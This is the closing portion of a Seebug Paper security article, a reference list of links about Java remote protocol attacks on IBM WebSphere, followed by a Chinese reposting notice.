  * <https://www.zerodayinitiative.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere>
  * <https://www.secrss.com/articles/24353>
  * <https://cert.360.cn/report/detail?id=3d016bdef66b8e29936f8cb364f265c8>
  * <https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf>
  * <https://publib.boulder.ibm.com/tividd/td/ITMFTP/SC32-9412-00/en_US/HTML/arm48.htm>
  * <https://publib.boulder.ibm.com/tividd/td/ITMFTP/SC32-9412-00/en_US/HTML/arm48.htm>
  * <http://ws.apache.org/wsif/index.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1303/>

